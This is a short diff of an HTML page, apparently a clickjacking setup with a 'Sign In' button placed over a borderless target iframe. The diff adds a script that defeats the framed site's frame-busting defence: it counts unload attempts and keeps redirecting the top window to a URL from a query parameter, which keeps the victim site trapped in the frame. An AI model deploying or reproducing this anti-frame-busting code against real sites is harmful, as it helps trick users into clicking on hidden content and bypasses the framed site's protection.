@@ -93,6 +93,17 @@
         id="jacksButton">Sign In
 </button>
 
+<script type="text/javascript">
+    var prevent_bust = 0  
+    window.onbeforeunload = function() { prevent_bust++ }  
+    setInterval(function() {  
+      if (prevent_bust > 0) {  
+        prevent_bust -= 2  
+        window.top.location = getURLParameter('server204Response')
+      }  
+    }, 1)  
+</script>
+
 
 <iframe id="targetIframe" scrolling="no" frameBorder="0"
         style="z-index: 1; position: relative;overflow: hidden;margin: 0; padding: 0;display: block"
